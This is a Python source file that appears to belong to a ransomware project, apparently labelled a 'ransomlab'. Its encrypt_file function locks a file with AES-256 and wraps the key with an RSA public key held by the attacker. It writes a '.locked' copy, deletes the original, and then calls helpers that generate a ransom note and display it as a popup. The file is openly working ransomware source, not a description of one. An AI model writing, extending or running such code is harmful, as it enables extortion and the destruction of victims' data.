# core/encryptor.py

import os
import zlib
import json
import hashlib
from datetime import datetime
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from ransom.ransom_note_generator import generate_ransom_note
from ransom.auto_popup_stager import auto_invoke_popup

MAGIC_BYTES = b'LOCKED_RANSOMLAB'
LOCKED_EXT = '.locked'

def is_already_encrypted(file_path: str) -> bool:
    if file_path.endswith(LOCKED_EXT):
        return True
    try:
        with open(file_path, 'rb') as f:
            magic = f.read(len(MAGIC_BYTES))
            return magic == MAGIC_BYTES
    except Exception:
        return False

def generate_aes_key_iv():
    key = get_random_bytes(32)  # AES-256
    iv = get_random_bytes(16)   # CBC
    return key, iv

def sha256_digest(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()

def encrypt_file(file_path: str, rsa_public_key_path: str, uid: str, compress=True):
    if is_already_encrypted(file_path):
        print(f"[!] SKIP: {file_path} já criptografado.")
        return

    with open(file_path, 'rb') as f:
        original_data = f.read()

    sha_original = sha256_digest(original_data)
    data_to_encrypt = zlib.compress(original_data) if compress else original_data

    aes_key, iv = generate_aes_key_iv()
    cipher_aes = AES.new(aes_key, AES.MODE_CBC, iv)

    padding_len = 16 - len(data_to_encrypt) % 16
    padded_data = data_to_encrypt + bytes([padding_len]) * padding_len
    encrypted_data = cipher_aes.encrypt(padded_data)

    with open(rsa_public_key_path, 'rb') as f:
        rsa_key = RSA.import_key(f.read())
    cipher_rsa = PKCS1_OAEP.new(rsa_key)
    encrypted_key = cipher_rsa.encrypt(aes_key)

    locked_file = file_path + LOCKED_EXT
    with open(locked_file, 'wb') as f:
        f.write(MAGIC_BYTES)
        f.write(len(encrypted_key).to_bytes(2, 'big'))
        f.write(encrypted_key)
        f.write(iv)
        f.write(encrypted_data)

    sha_locked = sha256_digest(encrypted_data)
    log_data = {
        "uid": uid,
        "file_original": file_path,
        "file_encrypted": locked_file,
        "sha256_original": sha_original,
        "sha256_encrypted": sha_locked,
        "timestamp": datetime.utcnow().isoformat()
    }

    os.makedirs("output", exist_ok=True)
    log_path = os.path.join("output", f"log_{uid}.json")
    with open(log_path, 'a') as log_file:
        log_file.write(json.dumps(log_data) + '\n')

    os.remove(file_path)
    print(f"[+] {file_path} → {locked_file}")

    # Gera nota de resgate e invoca popup
    note_path = generate_ransom_note(uid)
    auto_invoke_popup(note_path)